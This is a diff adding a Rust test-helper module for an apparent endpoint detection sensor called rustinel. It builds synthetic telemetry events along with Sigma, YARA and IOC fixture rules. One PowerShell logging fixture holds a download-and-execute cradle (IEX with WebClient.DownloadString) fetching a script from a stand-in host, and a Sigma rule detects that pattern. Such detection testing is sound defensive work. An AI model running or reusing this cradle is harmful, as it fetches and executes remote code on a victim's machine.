@@ -1,0 +1,897 @@
+#![allow(dead_code)]
+
+use std::fs;
+use std::path::{Path, PathBuf};
+use std::process::{Child, Command, Stdio};
+use std::sync::Arc;
+use std::time::{Duration, SystemTime};
+
+use rustinel::config::IocConfig;
+use rustinel::models::ecs::EcsAlert;
+use rustinel::models::{
+    Alert, DnsQueryFields, EventFields, FileEventFields, NetworkConnectionFields, NormalizedEvent,
+    PowerShellClassicStartFields, PowerShellModuleFields, PowerShellScriptFields,
+    ProcessCreationFields, ServiceCreationFields,
+};
+use rustinel::normalizer::Normalizer;
+use rustinel::sensor::{
+    Platform, ProcessStartKey, RawEvent, RawPayload, RawProcessEvent, SensorAction,
+    SensorNormalization,
+};
+use rustinel::state::{DnsCache, HostState, ProcessCache, SidCache};
+use serde_json::Value;
+use tempfile::TempDir;
+
+pub const TEST_TIMESTAMP_SECS: u64 = 1_767_225_600;
+pub const TEST_PROCESS_START_TIME: u64 = 123_456_789;
+pub const TEST_PID: u32 = 4242;
+pub const TEST_PARENT_PID: u32 = 1000;
+pub const TEST_USER: &str = "alice";
+pub const TEST_SOURCE_IP: &str = "10.0.0.5";
+pub const TEST_SOURCE_PORT: u16 = 51324;
+pub const TEST_DESTINATION_IP: &str = "198.51.100.10";
+pub const TEST_DESTINATION_PORT: u16 = 443;
+pub const TEST_DOMAIN: &str = "example.test";
+pub const TEST_YARA_MARKER: &str = "RUSTINEL_TEST_MARKER";
+pub const TEST_SERVICE_NAME: &str = "RustinelTestSvc";
+pub const TEST_SERVICE_IMAGE_PATH: &str = r"C:\Windows\Temp\rustinel-fixture-service.exe";
+/// The Windows Event Log provider behind event 7045, as `service: system`
+/// rules select on it.
+pub const TEST_SERVICE_PROVIDER: &str = "Service Control Manager";
+pub const TEST_PS_CLASSIC_DATA: &str = "NewEngineState=Available\nHostName=ConsoleHost\nHostVersion=5.1.26100.9444\nHostApplication=powershell.exe -Version 2\nEngineVersion=2.0";
+
+pub struct TestNormalizer {
+    pub normalizer: Normalizer,
+    pub host_state: Arc<HostState>,
+    pub process_cache: Arc<ProcessCache>,
+    pub sid_cache: Arc<SidCache>,
+    pub dns_cache: Arc<DnsCache>,
+}
+
+impl TestNormalizer {
+    pub fn new() -> Self {
+        let host_state = Arc::new(HostState::default());
+        let process_cache = Arc::clone(&host_state.processes);
+        let sid_cache = Arc::clone(&host_state.users);
+        let dns_cache = Arc::clone(&host_state.dns);
+        let normalizer = Normalizer::new(Arc::clone(&host_state));
+
+        Self {
+            normalizer,
+            host_state,
+            process_cache,
+            sid_cache,
+            dns_cache,
+        }
+    }
+}
+
+impl Default for TestNormalizer {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+pub fn test_time() -> SystemTime {
+    SystemTime::UNIX_EPOCH + Duration::from_secs(TEST_TIMESTAMP_SECS)
+}
+
+pub fn provider_for(platform: Platform) -> &'static str {
+    match platform {
+        Platform::Windows => "etw",
+        Platform::Linux => "ebpf",
+        Platform::MacOS => "esf",
+    }
+}
+
+pub fn image_for(platform: Platform) -> &'static str {
+    match platform {
+        Platform::Windows => r"C:\Windows\System32\curl.exe",
+        Platform::Linux | Platform::MacOS => "/usr/bin/curl",
+    }
+}
+
+pub fn parent_image_for(platform: Platform) -> &'static str {
+    match platform {
+        Platform::Windows => r"C:\Windows\explorer.exe",
+        Platform::Linux | Platform::MacOS => "/usr/bin/bash",
+    }
+}
+
+pub fn test_file_path(platform: Platform) -> &'static str {
+    match platform {
+        Platform::Windows => r"C:\Users\alice\AppData\Local\Temp\rustinel-fixture.txt",
+        Platform::Linux | Platform::MacOS => "/tmp/rustinel-fixture.txt",
+    }
+}
+
+pub fn renamed_test_file_path(platform: Platform) -> &'static str {
+    match platform {
+        Platform::Windows => r"C:\Users\alice\AppData\Local\Temp\rustinel-renamed.txt",
+        Platform::Linux | Platform::MacOS => "/tmp/rustinel-renamed.txt",
+    }
+}
+
+pub fn process_start_event(platform: Platform) -> RawEvent {
+    let image = image_for(platform);
+    RawEvent {
+        process_name: None,
+        provenance: Default::default(),
+        platform,
+        provider: provider_for(platform),
+        action: SensorAction::Start,
+        normalization: SensorNormalization {
+            event_id: 1,
+            action_code: 1,
+        },
+        pid: Some(TEST_PID),
+        timestamp: test_time(),
+        source_seq: None,
+        process_start_key: Some(ProcessStartKey {
+            pid: TEST_PID,
+            start_time: TEST_PROCESS_START_TIME,
+        }),
+        parent_process_start_key: None,
+        payload: RawPayload::Process(RawProcessEvent::from_compatibility(
+            ProcessCreationFields {
+                hashes: None,
+                imphash: None,
+                container: Default::default(),
+                linux_identity: Box::new(rustinel::models::LinuxProcessIdentity {
+                    real_group_id: (platform == Platform::Linux).then(|| "1000".to_string()),
+                    ..Default::default()
+                }),
+                cgroup_id: None,
+                exec: if platform == Platform::Linux {
+                    Some(
+                        serde_json::from_value(serde_json::json!({"RealUserId": "1000"}))
+                            .expect("Linux real UID fixture"),
+                    )
+                } else {
+                    (platform == Platform::MacOS).then(|| {
+                        serde_json::from_value(serde_json::json!({
+                            "RealUserId": "501",
+                            "Signed": "false",
+                            "SignatureStatus": "unsigned",
+                            "CodeSigningFlags": "0",
+                            "IsPlatformBinary": false
+                        }))
+                        .expect("macOS exec metadata fixture")
+                    })
+                },
+                parent_process_id_derived: false,
+                windows: Default::default(),
+                image: Some(image.to_string()),
+                image_source: (platform == Platform::Linux).then(|| "proc".to_string()),
+                image_truncated: None,
+                original_file_name: (platform == Platform::Windows).then(|| "curl.exe".to_string()),
+                product: (platform == Platform::Windows).then(|| "curl".to_string()),
+                description: (platform == Platform::Windows).then(|| "test process".to_string()),
+                company: None,
+                file_version: None,
+                target_image: None,
+                command_line: Some(format!("{image} https://{TEST_DOMAIN}")),
+                process_id: Some(TEST_PID.to_string()),
+                process_start_time: (platform == Platform::MacOS)
+                    .then_some(TEST_PROCESS_START_TIME),
+                parent_process_id: Some(TEST_PARENT_PID.to_string()),
+                parent_image: Some(parent_image_for(platform).to_string()),
+                parent_command_line: Some("parent-shell".to_string()),
+                parent_user: None,
+                current_directory: (platform != Platform::Windows)
+                    .then(|| temp_current_directory(platform).to_string()),
+                integrity_level: None,
+                logon_id: None,
+                user: Some(TEST_USER.to_string()),
+            },
+            platform,
+            Some(TEST_PID),
+        )),
+    }
+}
+
+/// A Windows System 7045 record as the event log source decodes it.
+///
+/// `provider` is the Rustinel sensor that collected the record; the Windows
+/// provider that wrote it travels in the payload as `Provider_Name`.
+pub fn service_installation_event() -> RawEvent {
+    RawEvent {
+        process_name: None,
+        provenance: Default::default(),
+        platform: Platform::Windows,
+        provider: "windows_event_log",
+        action: SensorAction::Register,
+        normalization: SensorNormalization {
+            event_id: 7045,
+            action_code: 0,
+        },
+        pid: None,
+        timestamp: test_time(),
+        source_seq: None,
+        process_start_key: None,
+        parent_process_start_key: None,
+        payload: RawPayload::Service(ServiceCreationFields {
+            provider_name: Some(TEST_SERVICE_PROVIDER.to_string()),
+            service_name: Some(TEST_SERVICE_NAME.to_string()),
+            service_file_name: Some(TEST_SERVICE_IMAGE_PATH.to_string()),
+            service_type: Some("user mode service".to_string()),
+            start_type: Some("demand start".to_string()),
+            account_name: Some("LocalSystem".to_string()),
+            user: None,
+            process_id: None,
+            image: None,
+        }),
+    }
+}
+
+pub fn powershell_classic_start_event() -> RawEvent {
+    RawEvent {
+        process_name: None,
+        provenance: Default::default(),
+        platform: Platform::Windows,
+        provider: "windows_event_log",
+        action: SensorAction::Start,
+        normalization: SensorNormalization {
+            event_id: 400,
+            action_code: 0,
+        },
+        pid: Some(TEST_PID),
+        timestamp: test_time(),
+        source_seq: Some(1_132_233),
+        process_start_key: None,
+        parent_process_start_key: None,
+        payload: RawPayload::PowerShellClassicStart(PowerShellClassicStartFields {
+            data: Some(TEST_PS_CLASSIC_DATA.to_string()),
+        }),
+    }
+}
+
+pub fn network_connect_event(platform: Platform) -> RawEvent {
+    RawEvent {
+        process_name: None,
+        provenance: Default::default(),
+        platform,
+        provider: provider_for(platform),
+        action: SensorAction::Connect,
+        normalization: SensorNormalization {
+            event_id: 3,
+            action_code: 12,
+        },
+        pid: Some(TEST_PID),
+        timestamp: test_time(),
+        source_seq: None,
+        process_start_key: Some(ProcessStartKey {
+            pid: TEST_PID,
+            start_time: TEST_PROCESS_START_TIME,
+        }),
+        parent_process_start_key: None,
+        payload: RawPayload::Network(NetworkConnectionFields {
+            destination_ip: Some(TEST_DESTINATION_IP.to_string()),
+            source_ip: Some(TEST_SOURCE_IP.to_string()),
+            destination_port: Some(TEST_DESTINATION_PORT.to_string()),
+            source_port: Some(TEST_SOURCE_PORT.to_string()),
+            process_id: Some(TEST_PID.to_string()),
+            image: None,
+            user: Some(TEST_USER.to_string()),
+            destination_hostname: None,
+            protocol: Some("tcp".to_string()),
+            initiated: Some(true),
+        }),
+    }
+}
+
+pub fn file_create_event(platform: Platform) -> RawEvent {
+    file_event(
+        platform,
+        SensorAction::Create,
+        None,
+        Some(test_file_path(platform)),
+    )
+}
+
+pub fn file_delete_event(platform: Platform) -> RawEvent {
+    file_event(
+        platform,
+        SensorAction::Delete,
+        None,
+        Some(test_file_path(platform)),
+    )
+}
+
+pub fn file_modify_event(platform: Platform) -> RawEvent {
+    file_event(
+        platform,
+        SensorAction::Modify,
+        None,
+        Some(test_file_path(platform)),
+    )
+}
+
+pub fn file_rename_event(platform: Platform) -> RawEvent {
+    file_event(
+        platform,
+        SensorAction::Rename,
+        (platform != Platform::Windows).then(|| test_file_path(platform)),
+        Some(renamed_test_file_path(platform)),
+    )
+}
+
+pub fn dns_query_event(platform: Platform) -> RawEvent {
+    RawEvent {
+        process_name: None,
+        provenance: Default::default(),
+        platform,
+        provider: provider_for(platform),
+        action: SensorAction::Query,
+        normalization: SensorNormalization {
+            event_id: 22,
+            action_code: 0,
+        },
+        pid: Some(TEST_PID),
+        timestamp: test_time(),
+        source_seq: None,
+        process_start_key: Some(ProcessStartKey {
+            pid: TEST_PID,
+            start_time: TEST_PROCESS_START_TIME,
+        }),
+        parent_process_start_key: None,
+        payload: RawPayload::Dns(DnsQueryFields {
+            query_truncated: None,
+            user: None,
+            query_name: Some(TEST_DOMAIN.to_string()),
+            query_results: Some(TEST_DESTINATION_IP.to_string()),
+            record_type: (platform != Platform::Windows).then(|| "A".to_string()),
+            query_status: Some("NOERROR".to_string()),
+            process_id: Some(TEST_PID.to_string()),
+            image: None,
+        }),
+    }
+}
+
+/// PowerShell module logging context, in the shape event 4103 delivers it: a
+/// newline-separated `name = value` block whose `Host Application` line carries
+/// the full interpreter command line.
+pub const TEST_PS_MODULE_CONTEXT: &str = concat!(
+    "        Severity = Informational\n",
+    "        Host Name = ConsoleHost\n",
+    "        Host Version = 5.1.26100.9168\n",
+    "        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ",
+    "-NoProfile -Command IEX (New-Object System.Net.WebClient)",
+    ".DownloadString('http://example.test/stage.ps1')\n",
+    "        Command Name = New-Object\n",
+    "        Command Type = Cmdlet\n",
+    "        User = lab\\alice\n",
+    "        Shell ID = Microsoft.PowerShell",
+);
+
+pub const TEST_PS_MODULE_PAYLOAD: &str = concat!(
+    "CommandInvocation(New-Object): \"New-Object\"\n",
+    "ParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"",
+);
+
+/// Windows PowerShell module logging event (ETW 4103), the `ps_module`
+/// logsource. Only Windows publishes it, so there is no platform parameter.
+pub fn powershell_module_event() -> RawEvent {
+    RawEvent {
+        process_name: None,
+        provenance: Default::default(),
+        platform: Platform::Windows,
+        provider: "etw",
+        action: SensorAction::Execute,
+        normalization: SensorNormalization {
+            event_id: 4103,
+            action_code: 0,
+        },
+        pid: Some(TEST_PID),
+        timestamp: test_time(),
+        source_seq: None,
+        process_start_key: None,
+        parent_process_start_key: None,
+        payload: RawPayload::PowerShellModule(PowerShellModuleFields {
+            context_info: Some(TEST_PS_MODULE_CONTEXT.to_string()),
+            payload: Some(TEST_PS_MODULE_PAYLOAD.to_string()),
+            process_id: Some(TEST_PID.to_string()),
+            image: None,
+            user: None,
+        }),
+    }
+}
+
+/// Windows PowerShell script-block logging event (ETW 4104), the existing
+/// `ps_script` logsource. This keeps the compatibility test independent of a
+/// live PowerShell provider.
+pub fn powershell_script_event() -> RawEvent {
+    RawEvent {
+        process_name: None,
+        provenance: Default::default(),
+        platform: Platform::Windows,
+        provider: "etw",
+        action: SensorAction::Execute,
+        normalization: SensorNormalization {
+            event_id: 4104,
+            action_code: 0,
+        },
+        pid: Some(TEST_PID),
+        timestamp: test_time(),
+        source_seq: None,
+        process_start_key: None,
+        parent_process_start_key: None,
+        payload: RawPayload::Scripting(PowerShellScriptFields {
+            script_block_text: Some("Get-Process".to_string()),
+            script_block_id: Some("script-block-4104".to_string()),
+            message_number: None,
+            message_total: None,
+            path: Some(r"C:\lab\fixture.ps1".to_string()),
+            process_id: Some(TEST_PID.to_string()),
+            image: Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".to_string()),
+            user: Some("LAB\\alice".to_string()),
+        }),
+    }
+}
+
+/// Build a file event whose numbering comes from the shared sensor table, so
+/// fixtures cannot encode a mapping that no sensor actually emits.
+pub fn file_event(
+    platform: Platform,
+    action: SensorAction,
+    source_filename: Option<&str>,
+    target_filename: Option<&str>,
+) -> RawEvent {
+    RawEvent {
+        process_name: None,
+        provenance: Default::default(),
+        platform,
+        provider: provider_for(platform),
+        action,
+        normalization: SensorNormalization::for_file_action(action)
+            .expect("file action is in the shared table"),
+        pid: Some(TEST_PID),
+        timestamp: test_time(),
+        source_seq: None,
+        process_start_key: Some(ProcessStartKey {
+            pid: TEST_PID,
+            start_time: TEST_PROCESS_START_TIME,
+        }),
+        parent_process_start_key: None,
+        payload: RawPayload::File(FileEventFields {
+            source_filename: source_filename.map(ToString::to_string),
+            target_filename: target_filename.map(ToString::to_string),
+            process_id: Some(TEST_PID.to_string()),
+            image: None,
+            creation_utc_time: None,
+            previous_creation_utc_time: None,
+            user: Some(TEST_USER.to_string()),
+            file_identity: None,
+            path_truncated: None,
+        }),
+    }
+}
+
+fn temp_current_directory(platform: Platform) -> &'static str {
+    match platform {
+        Platform::Windows => r"C:\Users\alice\AppData\Local\Temp",
+        Platform::Linux | Platform::MacOS => "/tmp",
+    }
+}
+
+pub struct SigmaFixture {
+    _tempdir: TempDir,
+    rules_dir: PathBuf,
+}
+
+impl SigmaFixture {
+    pub fn new() -> Self {
+        let tempdir = tempfile::tempdir().expect("create sigma fixture tempdir");
+        let rules_dir = tempdir.path().join("sigma");
+        fs::create_dir_all(&rules_dir).expect("create sigma rules dir");
+        Self {
+            _tempdir: tempdir,
+            rules_dir,
+        }
+    }
+
+    pub fn rules_dir(&self) -> &Path {
+        &self.rules_dir
+    }
+
+    pub fn write_rule(&self, filename: &str, yaml: &str) -> PathBuf {
+        write_fixture_file(&self.rules_dir, filename, yaml.as_bytes())
+    }
+
+    pub fn write_process_rule(&self, platform: Platform) -> PathBuf {
+        let product = platform_product(platform);
+        let image_suffix = match platform {
+            Platform::Windows => "curl.exe",
+            Platform::Linux | Platform::MacOS => "/curl",
+        };
+        self.write_rule(
+            "process.yml",
+            &format!(
+                r#"title: Test Process Curl
+logsource:
+  product: {product}
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: "{image_suffix}"
+    CommandLine|contains: "{TEST_DOMAIN}"
+  condition: selection
+level: high
+"#
+            ),
+        )
+    }
+
+    /// A `ps_module` rule shaped like the SigmaHQ corpus: no `service`, and
+    /// selections that read only `ContextInfo` and `Payload`.
+    pub fn write_ps_module_rule(&self) -> PathBuf {
+        self.write_rule(
+            "ps_module.yml",
+            r#"title: Test PowerShell Module Download
+logsource:
+  product: windows
+  category: ps_module
+detection:
+  selection_webclient:
+    ContextInfo|contains: "System.Net.WebClient"
+  selection_function:
+    ContextInfo|contains:
+      - ".DownloadFile("
+      - ".DownloadString("
+  selection_payload:
+    Payload|contains: "CommandInvocation(New-Object)"
+  condition: all of selection_*
+level: medium
+"#,
+        )
+    }
+
+    pub fn write_ps_classic_start_rule(&self) -> PathBuf {
+        self.write_rule(
+            "ps_classic_start.yml",
+            r#"title: Test PowerShell Downgrade
+logsource:
+  product: windows
+  category: ps_classic_start
+detection:
+  selection:
+    Data|contains: "EngineVersion=2."
+  filter_main:
+    Data|contains: "HostVersion=2."
+  condition: selection and not filter_main
+level: high
+"#,
+        )
+    }
+
+    pub fn write_network_rule(&self, platform: Platform) -> PathBuf {
+        let product = platform_product(platform);
+        self.write_rule(
+            "network.yml",
+            &format!(
+                r#"title: Test Network Destination
+logsource:
+  product: {product}
+  category: network_connection
+detection:
+  selection:
+    DestinationIp: "{TEST_DESTINATION_IP}"
+    DestinationPort: "{TEST_DESTINATION_PORT}"
+  condition: selection
+level: medium
+"#
+            ),
+        )
+    }
+
+    /// A `service: system` rule shaped like SigmaHQ's
+    /// `windows/builtin/system/service_control_manager` family: it selects on
+    /// `Provider_Name`, `EventID`, and `ImagePath`, which is why none of them
+    /// may be missing for the rule to fire.
+    pub fn write_service_rule(&self) -> PathBuf {
+        self.write_rule(
+            "service.yml",
+            &format!(
+                r#"title: Test Service Installation
+logsource:
+  product: windows
+  service: system
+detection:
+  selection:
+    Provider_Name: "{TEST_SERVICE_PROVIDER}"
+    EventID: 7045
+    ImagePath|contains: "rustinel-fixture-service.exe"
+  condition: selection
+level: high
+"#
+            ),
+        )
+    }
+
+    pub fn write_file_rule(&self, platform: Platform) -> PathBuf {
+        let product = platform_product(platform);
+        self.write_rule(
+            "file.yml",
+            &format!(
+                r#"title: Test File Event
+logsource:
+  product: {product}
+  category: file_event
+detection:
+  selection:
+    TargetFilename|endswith: "rustinel-fixture.txt"
+  condition: selection
+level: low
+"#
+            ),
+        )
+    }
+}
+
+pub struct YaraFixture {
+    _tempdir: TempDir,
+    rules_dir: PathBuf,
+    sample_dir: PathBuf,
+}
+
+impl YaraFixture {
+    pub fn new() -> Self {
+        let tempdir = tempfile::tempdir().expect("create yara fixture tempdir");
+        let rules_dir = tempdir.path().join("yara");
+        let sample_dir = tempdir.path().join("samples");
+        fs::create_dir_all(&rules_dir).expect("create yara rules dir");
+        fs::create_dir_all(&sample_dir).expect("create yara samples dir");
+        Self {
+            _tempdir: tempdir,
+            rules_dir,
+            sample_dir,
+        }
+    }
+
+    pub fn rules_dir(&self) -> &Path {
+        &self.rules_dir
+    }
+
+    pub fn sample_dir(&self) -> &Path {
+        &self.sample_dir
+    }
+
+    pub fn write_rule(&self, filename: &str, rule_name: &str, marker: &str) -> PathBuf {
+        let rule = format!(
+            r#"rule {rule_name} {{
+    strings:
+        $marker = "{marker}" ascii wide
+    condition:
+        $marker
+}}
+"#
+        );
+        write_fixture_file(&self.rules_dir, filename, rule.as_bytes())
+    }
+
+    pub fn write_default_rule(&self) -> PathBuf {
+        self.write_rule("marker.yar", "TestMarkerString", TEST_YARA_MARKER)
+    }
+
+    pub fn write_sample(&self, filename: &str, bytes: &[u8]) -> PathBuf {
+        write_fixture_file(&self.sample_dir, filename, bytes)
+    }
+
+    pub fn write_marker_sample(&self) -> PathBuf {
+        self.write_sample("marker.bin", TEST_YARA_MARKER.as_bytes())
+    }
+
+    pub fn write_clean_sample(&self) -> PathBuf {
+        self.write_sample("clean.bin", b"harmless bytes with no known marker")
+    }
+}
+
+pub struct IocFixture {
+    _tempdir: TempDir,
+    root: PathBuf,
+    hashes_path: PathBuf,
+    ips_path: PathBuf,
+    domains_path: PathBuf,
+    paths_regex_path: PathBuf,
+}
+
+impl IocFixture {
+    pub fn new() -> Self {
+        let tempdir = tempfile::tempdir().expect("create ioc fixture tempdir");
+        let root = tempdir.path().join("ioc");
+        fs::create_dir_all(&root).expect("create ioc dir");
+
+        let fixture = Self {
+            hashes_path: root.join("hashes.txt"),
+            ips_path: root.join("ips.txt"),
+            domains_path: root.join("domains.txt"),
+            paths_regex_path: root.join("paths_regex.txt"),
+            _tempdir: tempdir,
+            root,
+        };
+
+        fixture.write_hashes("");
+        fixture.write_ips("");
+        fixture.write_domains("");
+        fixture.write_paths_regex("");
+        fixture
+    }
+
+    pub fn root(&self) -> &Path {
+        &self.root
+    }
+
+    pub fn config(&self) -> IocConfig {
+        IocConfig {
+            enabled: true,
+            hashes_path: self.hashes_path.clone(),
+            ips_path: self.ips_path.clone(),
+            domains_path: self.domains_path.clone(),
+            paths_regex_path: self.paths_regex_path.clone(),
+            default_severity: "high".to_string(),
+            max_file_size_mb: 16,
+            hash_allowlist_paths: Vec::new(),
+        }
+    }
+
+    pub fn write_hashes(&self, content: &str) -> PathBuf {
+        write_fixture_file(&self.root, "hashes.txt", content.as_bytes())
+    }
+
+    pub fn write_ips(&self, content: &str) -> PathBuf {
+        write_fixture_file(&self.root, "ips.txt", content.as_bytes())
+    }
+
+    pub fn write_domains(&self, content: &str) -> PathBuf {
+        write_fixture_file(&self.root, "domains.txt", content.as_bytes())
+    }
+
+    pub fn write_paths_regex(&self, content: &str) -> PathBuf {
+        write_fixture_file(&self.root, "paths_regex.txt", content.as_bytes())
+    }
+}
+
+pub fn ecs_json(alert: &Alert) -> Value {
+    serde_json::to_value(EcsAlert::from(alert)).expect("serialize ECS alert")
+}
+
+pub fn assert_ecs_field_eq(json: &Value, field: &str, expected: impl Into<Value>) {
+    assert_eq!(
+        json.get(field),
+        Some(&expected.into()),
+        "unexpected ECS field {field}"
+    );
+}
+
+pub fn assert_ecs_field_present(json: &Value, field: &str) {
+    assert!(json.get(field).is_some(), "missing ECS field {field}");
+}
+
+pub fn assert_normalized_field_eq(event: &NormalizedEvent, field: &str, expected: &str) {
+    assert_eq!(
+        event.get_field(field),
+        Some(expected),
+        "unexpected normalized field {field}"
+    );
+}
+
+pub fn event_fields_from_payload(event: RawEvent) -> EventFields {
+    match event.payload {
+        RawPayload::Process(fields) => EventFields::ProcessCreation(fields.compatibility_fields()),
+        RawPayload::Network(fields) => EventFields::NetworkConnection(fields),
+        RawPayload::File(fields) => EventFields::FileEvent(fields),
+        RawPayload::Dns(fields) => EventFields::DnsQuery(fields),
+        RawPayload::Registry(fields) => EventFields::RegistryEvent(fields),
+        RawPayload::ImageLoad(fields) | RawPayload::DriverLoad(fields) => {
+            EventFields::ImageLoad(fields)
+        }
+        RawPayload::Scripting(fields) => EventFields::PowerShellScript(fields),
+        RawPayload::PowerShellModule(fields) => EventFields::PowerShellModule(fields),
+        RawPayload::PowerShellClassicStart(fields) => EventFields::PowerShellClassicStart(fields),
+        RawPayload::Wmi(fields) => EventFields::WmiEvent(fields),
+        RawPayload::Service(fields) => EventFields::ServiceCreation(fields),
+        RawPayload::Task(fields) => EventFields::TaskCreation(fields),
+        RawPayload::Security(fields) => EventFields::SecurityAudit(fields),
+        RawPayload::Defender(fields) => EventFields::SecurityAudit(fields),
+        RawPayload::Application(fields) => EventFields::ApplicationEvent(fields),
+    }
+}
+
+pub struct ChildProcessGuard {
+    child: Child,
+}
+
+impl ChildProcessGuard {
+    pub fn spawn(path: impl AsRef<Path>) -> std::io::Result<Self> {
+        let child = Command::new(path.as_ref())
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn()?;
+        Ok(Self { child })
+    }
+
+    pub fn id(&self) -> u32 {
+        self.child.id()
+    }
+
+    pub fn child_mut(&mut self) -> &mut Child {
+        &mut self.child
+    }
+
+    pub fn terminate(mut self) -> std::io::Result<()> {
+        self.kill_and_wait()
+    }
+
+    fn kill_and_wait(&mut self) -> std::io::Result<()> {
+        if self.child.try_wait()?.is_none() {
+            let _ = self.child.kill();
+        }
+        let _ = self.child.wait();
+        Ok(())
+    }
+}
+
+impl Drop for ChildProcessGuard {
+    fn drop(&mut self) {
+        let _ = self.kill_and_wait();
+    }
+}
+
+fn write_fixture_file(root: &Path, filename: &str, bytes: &[u8]) -> PathBuf {
+    let path = root.join(filename);
+    if let Some(parent) = path.parent() {
+        fs::create_dir_all(parent).expect("create fixture parent dir");
+    }
+    fs::write(&path, bytes).expect("write fixture file");
+    path
+}
+
+fn platform_product(platform: Platform) -> &'static str {
+    match platform {
+        Platform::Windows => "windows",
+        Platform::Linux => "linux",
+        Platform::MacOS => "macos",
+    }
+}
+
+/// Polls `condition` every 10 ms until it holds, panicking once `timeout` passes.
+///
+/// Use this instead of a fixed sleep followed by an assertion: it returns as
+/// soon as the state is reached and tolerates a slow runner up to `timeout`.
+pub async fn wait_until(timeout: Duration, condition: impl Fn() -> bool) {
+    let deadline = std::time::Instant::now() + timeout;
+    while !condition() {
+        assert!(
+            std::time::Instant::now() < deadline,
+            "condition not reached within {timeout:?}"
+        );
+        tokio::time::sleep(Duration::from_millis(10)).await;
+    }
+}
+
+/// Path of the `memory_target` example built by `cargo build --example memory_target`.
+///
+/// Resolved from the running test binary (`<target>/<profile>/deps/<test>`), so
+/// it follows `CARGO_TARGET_DIR`, `cargo llvm-cov`, and release test runs
+/// instead of assuming `target/debug`.
+pub fn memory_target_exe() -> PathBuf {
+    let test_exe = std::env::current_exe().expect("locate the test binary");
+    let profile_dir = test_exe
+        .parent()
+        .and_then(Path::parent)
+        .expect("test binary lives in <target>/<profile>/deps");
+    let name = format!("memory_target{}", std::env::consts::EXE_SUFFIX);
+    profile_dir.join("examples").join(name)
+}
+
+/// Records that a test could not check anything on this host.
+///
+/// Prints a marker CI greps for after re-running with `--nocapture`, and fails
+/// when `RUSTINEL_FAIL_ON_SKIP` is set.
+pub fn skip_test(reason: &str) {
+    eprintln!("RUSTINEL_TEST_SKIPPED: {reason}");
+    assert!(
+        std::env::var_os("RUSTINEL_FAIL_ON_SKIP").is_none(),
+        "{reason} (RUSTINEL_FAIL_ON_SKIP is set)"
+    );
+}
